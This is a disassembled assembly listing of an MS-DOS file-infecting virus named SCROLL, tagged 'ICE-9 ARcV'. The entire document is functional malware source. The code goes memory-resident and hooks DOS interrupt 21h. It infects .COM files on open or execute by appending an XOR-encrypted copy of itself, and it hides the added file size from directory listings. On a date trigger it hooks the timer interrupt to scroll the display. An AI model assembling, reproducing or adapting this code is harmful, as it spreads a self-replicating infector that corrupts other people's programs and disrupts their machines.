PAGE  59,132

;��������������������������������������������������������������������������
;��                                                  ��
;��             SCROLL                                   ��
;��                                                  ��
;��      Created:   26-Oct-92                                        ��
;��      Passes:    5          Analysis Options on: none                 ��
;��                                                  ��
;��������������������������������������������������������������������������

data_1e     equ 84h
data_2e     equ 86h
data_3e     equ 10Bh
rs232_port_1_   equ 400h
rs232_port_2_   equ 402h
video_port_ equ 463h
data_8e     equ 0           ;*
data_9e     equ 3           ;*
data_10e    equ 12h         ;*
data_26e    equ 42Eh            ;*

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 100h

scroll      proc    far

start:
        xor si,si           ; Zero register
        call    sub_1
        jmp short loc_1
        db  0, 0, 0, 0
loc_1:
        call    sub_1
        jmp short loc_3
        db  0, 0, 0, 0

scroll      endp

;��������������������������������������������������������������������������
;                              SUBROUTINE
;��������������������������������������������������������������������������

sub_1       proc    near
        call    sub_2

;���� External Entry into Subroutine ��������������������������������������

sub_2:
        pop ax
        xchg    ax,si
        sub si,117h
        lea di,[si+12Bh]        ; Load effective addr
        mov cx,2D6h

locloop_2:
        xor byte ptr [di],1
        inc di
        loop    locloop_2       ; Loop if cx > 0

        retn
sub_1       endp

loc_3:
        lea ax,[si+3EDh]        ; Load effective addr
        mov di,100h
        mov cx,2
        xchg    ax,si
        cld             ; Clear direction
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        xchg    ax,si
        mov byte ptr cs:data_17,0
        mov ax,0F307h
        int 21h         ; ??INT Non-standard interrupt
        cmp ax,0CF9h
        je  loc_4           ; Jump if equal
        jmp short loc_5
loc_4:
        mov ax,cs
        mov ds,ax
        mov es,ax
        mov ax,offset start
        jmp ax          ;*Register jump
loc_5:
        xor ax,ax           ; Zero register
        push    ax
        mov ax,es
        dec ax
        mov es,ax
        pop ds
        cmp byte ptr es:data_8e,5Ah ; 'Z'
        nop                         ;*ASM fixup - sign extn byte
        jne loc_4           ; Jump if not equal
        mov ax,es:data_9e
        sub ax,0BCh
        jc  loc_4           ; Jump if carry Set
        mov es:data_9e,ax
        sub word ptr es:data_10e,0BCh
        mov es,es:data_10e
        push    ds
        push    cs
        pop ds
        mov di,data_3e
        lea ax,[si+10Bh]        ; Load effective addr
        xchg    ax,si
        mov cx,31Bh
        cld             ; Clear direction
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        pop ds
        xchg    ax,si
        mov ah,2Ah
        int 21h         ; DOS Services  ah=function 2Ah
                        ;  get date, cx=year, dh=month
                        ;   dl=day, al=day-of-week 0=SUN
        cmp cx,7C9h
        jb  loc_6           ; Jump if below
        cmp dl,3
        jne loc_6           ; Jump if not equal
        cmp al,4
        jne loc_6           ; Jump if not equal
        jmp loc_21
loc_6:
        xor ax,ax           ; Zero register
        mov ds,ax
        mov ax,ds:data_1e
        mov bx,ds:data_2e
        mov word ptr es:data_20,ax
        mov word ptr es:data_20+2,bx
        cli             ; Disable interrupts
        mov word ptr ds:data_1e,249h
        mov ds:data_2e,es
        sti             ; Enable interrupts
        push    cs
        pop es
        jmp loc_4

;��������������������������������������������������������������������������
;
;                       External Entry Point
;
;��������������������������������������������������������������������������

int_1Ch_entry   proc    far
        inc cs:data_16
        cmp cs:data_16,1554h
        jb  loc_7           ; Jump if below
        push    ax
        push    dx
        push    ds
        xor ax,ax           ; Zero register
        mov ds,ax
        mov dx,ds:video_port_
        in  al,dx           ; port 3D4h, CGA/EGA reg index
        push    ax
        mov al,8
        out dx,al           ; port 3D4h, CGA/EGA reg index
                        ;  al = 8, interlace & skew
        inc dx
        in  al,dx           ; port 3D5h, CGA/EGA indxd data
        mov ah,al
        inc ah
        and ah,0Fh
        and al,0F0h
        or  al,ah
        out dx,al           ; port 3D5h, CGA/EGA indxd data
        pop ax
        dec dx
        out dx,al           ; port 3D4h, CGA/EGA reg index
                        ;  al = 0, horiz char total
        pop ds
        pop dx
        pop ax
loc_7:
        jmp dword ptr cs:data_14
data_14     dd  3AF50000h
data_16     dw  0
data_17     db  0
loc_8:
        push    bx
        push    es
        push    ax
        mov ah,2Fh          ; '/'
        call    sub_4
        pop ax
        call    sub_4
        push    ax
        cmp al,0FFh
        je  loc_10          ; Jump if equal
        cmp byte ptr es:[bx],0FFh
        jne loc_9           ; Jump if not equal
        add bx,7
loc_9:
        mov al,es:[bx+17h]
        and al,1Fh
        cmp al,1Fh
        jne loc_10          ; Jump if not equal
        sub word ptr es:[bx+1Dh],31Bh
loc_10:
        pop ax
        pop es
        pop bx
        retf    2           ; Return far
int_1Ch_entry   endp

loc_11:
        cmp ah,11h
        je  loc_8           ; Jump if equal
        cmp ah,12h
        je  loc_8           ; Jump if equal
        jmp short loc_14
                                    ;* No entry point to code
        cmp ax,0F307h
        jne loc_12          ; Jump if not equal
        neg ax
        retf    2           ; Return far
loc_12:
        cmp ah,4Eh          ; 'N'
        jb  loc_11          ; Jump if below
        cmp ah,4Fh          ; 'O'
        ja  loc_14          ; Jump if above
        jmp loc_22
loc_13:
        jmp dword ptr cs:data_20
loc_14:
        cmp cs:data_17,0FFh
        je  loc_13          ; Jump if equal
        cmp ah,3Dh          ; '='
        je  loc_15          ; Jump if equal
        cmp ah,4Bh          ; 'K'
        je  loc_15          ; Jump if equal
        jmp short loc_13
loc_15:
        push    ax
        push    bx
        push    cx
        push    dx
        push    es
        push    bp
        push    di
        push    ds
        mov di,dx
        mov cx,6Fh

locloop_16:
        cmp word ptr [di],432Eh
        jne loc_17          ; Jump if not equal
        cmp word ptr [di+2],4D4Fh
        jne loc_17          ; Jump if not equal
        cmp byte ptr [di+4],0
        jne loc_17          ; Jump if not equal
        jmp short loc_19
loc_17:
        inc di
        loop    locloop_16      ; Loop if cx > 0

loc_18:
        pop ds
        pop di
        pop bp
        pop es
        pop dx
        pop cx
        pop bx
        pop ax
        jmp short loc_13
loc_19:
        mov bp,sp
        mov dx,[bp+8]
        mov ax,4300h
        call    sub_4
        mov cs:data_25,cx
        and cx,1Fh
        cmp cx,2
        jae loc_18          ; Jump if above or =
        xor cx,cx           ; Zero register
        mov ax,4301h
        call    sub_4
        mov ax,3D02h
        call    sub_4
        jc  loc_18          ; Jump if carry Set
        mov cs:data_22,ax
        mov ax,cs
        mov ds,ax
        mov es,ax
        mov ax,5700h
        call    sub_3
        mov data_23,cx
        mov data_24,dx
        mov ah,3Fh          ; '?'
        mov dx,3EDh
        mov cx,4
        call    sub_3
        mov ax,4200h
        xor cx,cx           ; Zero register
        mov dx,data_18
        add dx,3
        call    sub_3
        mov ah,3Fh          ; '?'
        mov dx,42Eh
        mov cx,5
        call    sub_3
        mov di,data_26e
        mov si,10Bh
        mov cx,5
        cld             ; Clear direction
        repe    cmpsb           ; Rep zf=1+cx >0 Cmp [si] to es:[di]
        jz  loc_20          ; Jump if zero
        mov ax,4202h
        xor cx,cx           ; Zero register
        mov dx,cx
        call    sub_3
        cmp ax,0F9E5h
        ja  loc_20          ; Jump if above
        sub ax,3
        mov data_19,ax
        call    sub_5
        mov ax,4200h
        xor cx,cx           ; Zero register
        mov dx,cx
        call    sub_3
        mov ah,40h          ; '@'
        mov cx,3
        mov dx,3F1h
        call    sub_3
        mov cx,data_23
        or  cl,1Fh
        mov dx,data_24
        mov ax,5701h
        call    sub_3
        mov dx,[bp+8]
        pop ds
        push    ds
        mov ax,4301h
        mov cx,cs:data_25
        call    sub_4
loc_20:
        mov ah,3Eh          ; '>'
        call    sub_3
        jmp loc_18
loc_21:
        push    es
        mov ah,12h
        mov bx,2210h
        int 10h         ; Video display   ah=functn 12h
                        ;  EGA/VGA special, bl=function
        pop es
        cmp bx,2210h
        jne loc_24          ; Jump if not equal
        jmp loc_6
loc_22:
        push    es
        push    bx
        push    ax
        mov ah,2Fh          ; '/'
        call    sub_4
        pop ax
        call    sub_4
        pushf               ; Push flags
        push    ax
        jc  loc_23          ; Jump if carry Set
        mov ah,es:[bx+16h]
        and ah,1Fh
        cmp ah,1Fh
        jne loc_23          ; Jump if not equal
        sub word ptr es:[bx+1Ah],31Bh
loc_23:
        pop ax
        popf                ; Pop flags
        pop bx
        pop es
        retf    2           ; Return far

;��������������������������������������������������������������������������
;                              SUBROUTINE
;��������������������������������������������������������������������������

sub_3       proc    near
        mov bx,cs:data_22

;���� External Entry into Subroutine ��������������������������������������

sub_4:
        pushf               ; Push flags
        call    dword ptr cs:data_20
        retn
sub_3       endp

loc_24:
        mov ax,351Ch
        push    es
        int 21h         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
        pop ds
        mov word ptr data_14,bx
        mov word ptr data_14+2,es
        mov ax,251Ch
        mov dx,offset int_1Ch_entry
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        push    ds
        pop es
        mov data_17,0FFh
        jmp loc_6
        db  '[SCROLL]'
        db  0
        db  'ICE-9 ARcV'
        db   00h,0B4h
data_18     dw  0CD4Ch
        db   21h,0E9h
data_19     dw  0
        db  '\COMMAND.COM'
        db  0
data_20     dd  00000h

;��������������������������������������������������������������������������
;                              SUBROUTINE
;��������������������������������������������������������������������������

sub_5       proc    near
        cli             ; Disable interrupts
        call    sub_1
        mov ah,40h          ; '@'
        mov cx,31Bh
        mov bx,data_22
        mov dx,10Bh
        pushf               ; Push flags
        call    cs:data_20
        call    sub_1
        add byte ptr cs:[126h],2
        sti             ; Enable interrupts
        retn
sub_5       endp

data_22     dw  0
data_23     dw  0
data_24     dw  0
data_25     dw  0

seg_a       ends



        end start
        